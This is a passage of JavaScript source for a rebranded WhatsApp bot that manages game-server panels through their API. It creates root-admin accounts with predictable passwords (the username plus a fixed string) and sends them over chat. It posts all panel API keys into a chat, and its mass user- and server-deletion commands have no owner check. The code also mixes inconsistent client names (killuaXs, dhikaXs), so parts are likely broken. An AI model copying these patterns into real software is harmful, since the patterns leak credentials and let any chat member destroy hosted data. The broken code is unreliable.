│ 🛠️ *Developer*: KilluaDev
└───────────────────
`;

    await KilluaXs.sendMessage(m.chat, {
        video: { url: videoUrl },
        caption: teks,
        gifPlayback: true,
        gifAttribution: 1,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: 'Dhika Official market | secure 〽️',
                body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
                mediaType: 1,
                renderLargerThumbnail: false,
            },
        },
    }, { quoted: m });
}
break;

case 'cadmin':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let s = q.split('-');
 let email = s[0];
 let username = s[0];
 let nomor = s[1];

 if (s.length < 2) return killuaXs.sendMessage(m.chat, { text: `*Format salah!*\nPenggunaan:\n${prefix + command} user-nomer` });
 if (!username) return killuaXs.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user` });
 if (!nomor) return killuaXs.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username-@tag/nomor\n\nContoh :\n${prefix + command} example-@user` });

 let password = username + "Killua Official market | secure 〽️";
 let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

 // Membuat permintaan ke API untuk membuat user
 let f = await fetch(domain + "/api/application/users", {
 "method": "POST",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 },
 "body": JSON.stringify({
 "email": username + "@gmail.com",
 "username": username,
 "first_name": username,
 "last_name": "Memb",
 "language": "en",
 "root_admin": true,
 "password": password.toString()
 })
 });

 let data = await f.json();

 if (data.errors) return dhikaXs.sendMessage(m.chat, { text: JSON.stringify(data.errors[0], null, 2) });

 let user = data.attributes;

 let tks = `*_Paket Telah Terkirim Dengan Selamat✅_*`;

 // Kirim pesan dengan detail akun admin
 await dhikaXs.sendMessage(m.chat, { text: tks }, { quoted: m });

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke nomor yang ditentukan
 await dhikaXs.sendMessage(nomornya, {
 video: { url: videoUrl },
 caption: `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${username}
│ *Password* : ${password}
│ *link* : ${domain}
└───────────────────
> *_© Developer : KilluaDev*
`,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: 'Killua Official market | secure 〽️',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });
}
break;
case 'linkserver':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4';

 let teks = `
┌───「 *Killua Official market | secure 〽️* 」───
│ *Domain* : ${global.domain}
│ *Apikey* : ${global.apikey}
│ *Capikey* : ${global.capikey}
│ *Domain 2* : ${global.domain2}
│ *Apikey 2* : ${global.apikey2}
│ *Capikey 2* : ${global.capikey2}
│ *Domain 3* : ${global.domain3}
│ *Apikey 3* : ${global.apikey3}
│ *Capikey 3* : ${global.capikey3}
└───────────────────
`;

 await dhikaXs.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'Killua Official market | secure 〽️',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });
}
break;

case 'updomain':{
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domain = newteks;

 await killuaXs.sendMessage(m.chat, { text: "_Berhasil Mengganti Domain Panel✅_" }, { quoted: m });
 } else {
 await killuaXs.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
 }
}
break

case 'upapikey':{
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);

 const newteks = m.quoted ? m.quoted.text : text;

 if (newteks) {
 global.apikey = newteks;
 return killuaXs.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break

  
    




case 'clearadmin': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin , 48, 49, 50');
    }

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati proses penghapusan
            if (excludeIds.includes(u.id.toString())) {
                m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : DhikaDev*`);
                continue;
            }

            let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteUser.ok) {
                m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : DhikaDev*`);
            } else {
                let errorText = await deleteUser.text();
                m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

case 'clearserver': {
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver , 101, 102, 103');
    }

    try {
        // Mendapatkan daftar server
        let f = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return m.reply('Tidak ada server yang ditemukan.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(domain + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteServer.ok) {
                m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*Semua server berhasil dihapus kecuali yang dikecualikan!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

case 'clearserver2': {
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver2 , 201, 202, 203');
    }

    try {
        // Mendapatkan daftar server dari server 2
        let f = await fetch(global.domain2 + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey2,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return m.reply('Tidak ada server yang ditemukan di server 2.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(global.domain2 + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey2,
                }
            });

            if (deleteServer.ok) {
                m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*Semua server berhasil dihapus dari server 2 kecuali yang dikecualikan!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan di server 2: ' + error.message);
    }
    break;
}

case 'clearserver3': {
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver3 , 301, 302, 303');
    }

    try {
        // Mendapatkan daftar server dari server 3
        let f = await fetch(global.domain3 + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey3,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return m.reply('Tidak ada server yang ditemukan di server 3.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(global.domain3 + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey3,
                }
            });

            if (deleteServer.ok) {
                m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*Semua server berhasil dihapus dari server 3 kecuali yang dikecualikan!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan di server 3: ' + error.message);
    }
    break;
}

case 'setnamagb':{
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await killuaXs.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 if (!text) return m.reply('Masukkan nama grup baru!\nContoh: .setname Nama Grup Baru');

 try {
 await killuaXs.groupUpdateSubject(m.chat, text); // Ganti nama grup
 m.reply(`Berhasil mengganti nama grup menjadi: *${text}*`);
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengganti nama grup. Pastikan bot memiliki izin sebagai admin.');
 }
}
break;

case 'setppgb': {
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await killuaXs.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 // Periksa apakah ada gambar (bisa dari reply atau teks URL)
 let media;
 if (m.quoted && m.quoted.imageMessage) {
 media = await dhikaXs.downloadMediaMessage(m.quoted); // Ambil media dari reply
 } else if (text) {
 media = text; // Ambil URL gambar dari input teks
 } else {
 return m.reply('Kirim atau reply ke gambar, atau masukkan URL gambar untuk mengganti foto grup.');
 }

 try {
 await killuaXs.updateProfilePicture(m.chat, { url: media }); // Set foto grup
 m.reply('Berhasil mengganti foto profil grup.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengganti foto profil grup. Pastikan gambar valid dan sesuai.');
 }
}
break;

case 'closegroup': {
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await killuaXs.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 try {
 await killuaXs.groupSettingUpdate(m.chat, 'announcement');
 m.reply('Grup telah ditutup. Hanya admin yang dapat mengirim pesan.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal menutup grup.');
 }
}
break;

case 'opengroup': {
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await killuaXs.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 try {
 await killuaXs.groupSettingUpdate(m.chat, 'not_announcement');
 m.reply('Grup telah dibuka. Semua anggota dapat mengirim pesan.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal membuka grup.');
 }
}
break;

case 'setdeks':{
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di grup!');
 const groupMetadata = await killuaXs.groupMetadata(m.chat);
 const isAdmin = groupMetadata.participants.some((v) => v.id === m.sender && v.admin !== null);
 if (!isAdmin) return m.reply('Hanya admin yang dapat menggunakan perintah ini!');

 if (!text) return m.reply('Masukkan deskripsi baru untuk grup!');
 try {
 await dhikaXs.groupUpdateDescription(m.chat, text);
 m.reply('Berhasil mengganti deskripsi grup.');
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengubah deskripsi grup.');
 }
}
break;

case 'hidetag': {
 if (!m.isGroup) return Reply(mess.group);
 if (!isCreator && !m.isAdmin) return Reply(mess.admin);
 if (!text) return m.reply("Masukkan pesan yang ingin Anda kirimkan untuk men-tag semua anggota grup.");

 // Ambil metadata grup
 const groupMetadata = await killuaXs.groupMetadata(m.chat);
 if (!groupMetadata || !groupMetadata.participants) {
 return m.reply("Gagal mengambil data anggota grup.");
 }

 let member = groupMetadata.participants.map(v => v.id);
 await dhikaXs.sendMessage(m.chat, {text: text, mentions: member}, {quoted: m});
}
break

case 'kick': {
 if (!m.isGroup) return Reply(mess.group); // Pastikan perintah ini dijalankan di grup
 if (!isCreator && !m.isAdmin) return Reply(mess.admin); // Pastikan pengirim adalah admin atau creator grup
 
 // Mendapatkan ID pengguna yang akan dikeluarkan
 let userToKick = m.mentionedJid[0]; // Mengambil ID pengguna yang disebutkan
 if (!userToKick) return m.reply("Tag pengguna yang ingin dikeluarkan!"); // Pastikan pengguna ditandai
 
 // Melakukan kick atau mengeluarkan pengguna dari grup
 try {
 await killuaXs.groupParticipantsUpdate(m.chat, [userToKick], 'remove'); // Mengeluarkan anggota
 m.reply(`Pengguna @${userToKick.split('@')[0]} berhasil dikeluarkan dari grup.`, null, { mentions: [userToKick] });
 } catch (error) {
 console.error(error);
 m.reply("Gagal mengeluarkan pengguna dari grup.");
 }
}
break

case 'linkgc':
{
 if (!m.isGroup) return m.reply("Perintah ini hanya dapat digunakan di grup.");
 if (!isCreator && !m.isAdmin) return m.reply("Perintah ini hanya untuk admin grup.");
 
 try {
 // Pastikan metadata grup sudah ada
 const groupMetadata = await killuaXs.groupMetadata(m.chat);
 if (!groupMetadata) throw "Gagal mendapatkan metadata grup.";
 
 // Ambil kode undangan grup
 const inviteCode = await dhikaXs.groupInviteCode(m.chat);
 const groupLink = `https://chat.whatsapp.com/${inviteCode}`;
 m.reply(`┌───「 *AanzCuyxzzz-V2* 」───
│ *Link Group* : ${groupLink}
└───────────────────`);
 } catch (err) {
 console.error(err); // Log error ke konsol
 m.reply("Gagal mendapatkan link grup. Pastikan bot adalah admin dan grup memiliki kode undangan aktif.");
 }
}
break;


case 'cekip':
if (!text) return m.reply("Masukkan IP address atau domain yang ingin dicek! Contoh: 8.8.8.8 atau google.com");
 
 const axios = require('axios');
 try {
 // Lakukan request ke API untuk mendapatkan detail IP
 const response = await axios.get(`https://ipapi.co/${text}/json/`);
 const data = response.data;

 // Cek apakah data berhasil ditemukan
 if (data.error) return m.reply(`IP atau domain tidak ditemukan: ${text}`);

 // Format pesan hasil
 const message = `
🌐 **Informasi IP**
- **IP Address**: ${data.ip || "Tidak diketahui"}
- **Kota**: ${data.city || "Tidak diketahui"}
- **Wilayah**: ${data.region || "Tidak diketahui"}
- **Negara**: ${data.country_name || "Tidak diketahui"} (${data.country || "?"})
- **Kode Pos**: ${data.postal || "Tidak diketahui"}
- **Provider**: ${data.org || "Tidak diketahui"}
- **Latitude**: ${data.latitude || "Tidak diketahui"}
- **Longitude**: ${data.longitude || "Tidak diketahui"}
 `.trim();

 m.reply(message);
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat memproses permintaan. Pastikan IP atau domain valid, lalu coba lagi.");
 }
 break;

case 'translate': {
 if (!text) return m.reply("Masukkan format yang benar: translate <kode bahasa> <teks>. Contoh: translate en Selamat pagi");
 
 const args = text.split(' ');
 const targetLang = args.shift();
 const query = args.join(' ');

 if (!targetLang || !query) return m.reply("Masukkan format yang benar: translate <kode bahasa> <teks>. Contoh: translate en Selamat pagi");

 m.reply("Sedang menerjemahkan...");
 
 try {
 const axios = require('axios');
 const response = await axios.post('https://translate.googleapis.com/translate_a/single', null, {
 params: {
 client: 'gtx',
 sl: 'auto',
 tl: targetLang,
 dt: 't',
 q: query,
 },
 });

 const translation = response.data[0][0][0];
 m.reply(`Hasil terjemahan:\n${translation}`);
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat menerjemahkan teks. Pastikan format dan kode bahasa sudah benar.");
 }
}
break;

case 'fiturnew': {
 if (fiturNew.fitur.length === 0) {
 return m.reply("Tidak ada fitur baru yang ditambahkan.");
 }

 // Format daftar fitur baru untuk ditampilkan
 let message = "🌟 *Fitur Terbaru yang Ditambahkan* 🌟\n\n";
 fiturNew.fitur.forEach((fitur, index) => {
 message += `${index + 1}. ${fitur}\n`;
 });

 m.reply(message);
}
break;

// Case untuk menambahkan fitur baru ke daftar
case 'addfitur': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 if (!text) return m.reply(`Contoh: ${prefix + command} nama_fitur_baru`);

 let fiturBaru = text.trim();

 if (fiturNew.fitur.includes(fiturBaru)) {
 return m.reply("⚠️ Fitur ini sudah ada dalam daftar fitur terbaru.");
 }

 fiturNew.fitur.push(fiturBaru);

 // Simpan perubahan ke file fiturnew.json
 try {
 fs.writeFileSync('./fiturnew.json', JSON.stringify(fiturNew, null, 2));
 m.reply(`✅ Fitur "${fiturBaru}" berhasil ditambahkan ke daftar fitur terbaru.`);
 } catch (err) {
 console.error("Gagal menyimpan fiturnew.json", err);
 m.reply("❌ Terjadi kesalahan saat menyimpan daftar fitur baru.");
 }
}
break;

// Case untuk menghapus daftar fitur terbaru
case 'clearfitur': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

 fiturNew.fitur = [];

 try {
 fs.writeFileSync('./fiturnew.json', JSON.stringify(fiturNew, null, 2));
 m.reply("✅ Daftar fitur terbaru berhasil dihapus.");
 } catch (err) {
 console.error("Gagal menyimpan fiturnew.json", err);
 m.reply("❌ Terjadi kesalahan saat menghapus daftar fitur.");
 }
}
break;

;







case 'updomain2':{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domain2 = newteks;

 await killuaXs.sendMessage(m.chat, { text: "_Berhasil Mengganti Domain Panel✅_" }, { quoted: m });
 } else {
 await killuaXs.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
 }
}
break

case 'upapikey2':{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);

 const newteks = m.quoted ? m.quoted.text : text;

 if (newteks) {
 global.apikey2 = newteks;
 return killuaXs.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break

case 'upcapikey2':{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text; // Dapatkan teks dari pesan yang dibalas atau input

 // Update global capikey dengan nilai baru
 global.capikey2 = newteks;

 // Kirim balasan bahwa capikey telah berhasil diganti
 await killuaXs.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" }, { quoted: m });
 } else {
 // Jika format salah, kirimkan pesan contoh format yang benar
 await killuaXs.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
 }
}
break;

case 'cadmin2': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

 let s = q.split('-');
 let email = s[0];
 let username = s[0];
 let nomor = s[1];

 if (s.length < 2) return killuaXs.sendMessage(m.chat, { text: `*Format salah!*\nPenggunaan:\n${prefix + command} user-nomer` });
 if (!username) return dhikaXs.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user` });
 if (!nomor) return killuaXs.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username-@tag/nomor\n\nContoh :\n${prefix + command} example-@user` });

 let password = username + "DhikaDev";
 let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

 // Membuat permintaan ke API untuk membuat user di server 2
 let f = await fetch(global.domain2 + "/api/application/users", {
 "method": "POST",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2
 },
 "body": JSON.stringify({
 "email": username + "@gmail.com",
 "username": username,
 "first_name": username,
 "last_name": "Memb",
 "language": "en",
 "root_admin": true,
 "password": password.toString()
 })
 });

 let data = await f.json();

 if (data.errors) return dhikaXs.sendMessage(m.chat, { text: JSON.stringify(data.errors[0], null, 2) });

 let user = data.attributes;

 let tks = `*_Admin untuk Server 2 telah dibuat dan datanya telah dikirim ✅_*`;

 // Kirim pesan dengan detail akun admin
 await killuaXs.sendMessage(m.chat, { text: tks }, { quoted: m });

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke nomor yang ditentukan
 await killuaXs.sendMessage(nomornya, {
 video: { url: videoUrl },
 caption: `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${username}
│ *Password* : ${password}
│ *link* : ${global.domain2}
└───────────────────
> *_© Developer : KilluaDev*
`,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: 'Killua Official market | secure 〽️',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });
}
break;

case 'cadmin3': {
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

    let s = q.split('-');
    let email = s[0];
    let username = s[0];
    let nomor = s[1];

    if (s.length < 2) return dhikaXs.sendMessage(m.chat, { text: `*Format salah!*\nPenggunaan:\n${prefix + command} user-nomer` });
    if (!username) return dhikaXs.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user` });
    if (!nomor) return dhikaXs.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username-@tag/nomor\n\nContoh :\n${prefix + command} example-@user` });

    let password = username + "AanzCuyxzzz";
    let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    try {
        // Membuat permintaan ke API untuk membuat user di server 3
        let f = await fetch(global.domain3 + "/api/application/users", {
            "method": "POST",
            "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey3
            },
            "body": JSON.stringify({
                "email": username + "@gmail.com",
                "username": username,
                "first_name": username,
                "last_name": "Memb",
                "language": "en",
                "root_admin": true,
                "password": password.toString()
            })
        });

        let data = await f.json();

        if (data.errors) return dhikaXs.sendMessage(m.chat, { text: JSON.stringify(data.errors[0], null, 2) });

        let user = data.attributes;

        let tks = `*_Admin untuk Server 3 telah dibuat dan datanya telah dikirim ✅_*`;

        // Kirim pesan dengan detail akun admin
        await dhikaXs.sendMessage(m.chat, { text: tks }, { quoted: m });

        // URL video thumbnail
        const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

        // Kirim pesan ke nomor yang ditentukan
        await killuaXs.sendMessage(nomornya, {
            video: { url: videoUrl },
            caption: `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${username}
│ *Password* : ${password}
│ *link* : ${global.domain3}
└───────────────────
> *_© Developer : KilluaDev*
`,
            gifPlayback: true,
            gifAttribution: 1,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'Killua Official market | secure 〽️',
                    body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
                    mediaType: 1,
                    renderLargerThumbnail: false,
                },
            },
        });

    } catch (error) {
        m.reply(`❌ Terjadi kesalahan: ${error.message}`);
    }
    break;
}

case 'listadmin2':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input
 try {
 let f = await fetch(global.domain2 + `/api/application/users?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey2}`
 }
 });

 let res = await f.json();

 // Jika tidak ada data admin
 if (!res.data || res.data.length === 0) {
 return m.reply(`❌ Tidak ditemukan admin di server 2 pada halaman ${page}.`);
 }

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video yang ingin digunakan

 let teks = `╭─❒ *List Admin Server 2*\n`;

 for (let user of res.data) {
 let u = user.attributes;
 if (u.root_admin) { // Cek jika user adalah admin
 teks += `├ *ID*: ${u.id}\n`;
 teks += `├ *Username*: ${u.username}\n`;
 teks += `├ *Name*: ${u.first_name} ${u.last_name}\n`;
 teks += `├ *Email*: ${u.email}\n`;
 teks += `├ *Status*: ${u.server_limit === null ? 'Inactive' : 'Active'}\n`;
 teks += `├───────────────\n`;
 }
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Admin*: ${res.meta.pagination.count}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await dhikaXs.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'Killua Official market | secure 〽️',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data admin server 2.");
 }
}
break;



case 'listserver2':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

 let page = parseInt(args[0]) || 1; // Default halaman ke 1 jika tidak ada input

 try {
 let f = await fetch(global.domain2 + `/api/application/servers?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey2}`
 }
 });

 let res = await f.json();

 // Cek jika ada error dari API
 if (res.errors) {
 return m.reply(`❌ Gagal mengambil data server:\n${JSON.stringify(res.errors[0], null, 2)}`);
 }

 let servers = res.data;

 // Cek jika tidak ada server ditemukan
 if (!servers || servers.length === 0) {
 return m.reply("❌ Tidak ada server yang ditemukan di Server 2.");
 }

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video atau GIF

 let teks = `╭─❒ *List Server di Server 2*\n`;

 for (let server of servers) {
 let s = server.attributes;
 teks += `├ *ID Server*: ${s.id}\n`;
 teks += `├ *Nama*: ${s.name}\n`;
 teks += `├ *Deskripsi*: ${s.description}\n`;
 teks += `├ *Status*: ${s.suspended ? 'Suspend' : 'Aktif'}\n`;
 teks += `├───────────────\n`;
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Server*: ${res.meta.pagination.total}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
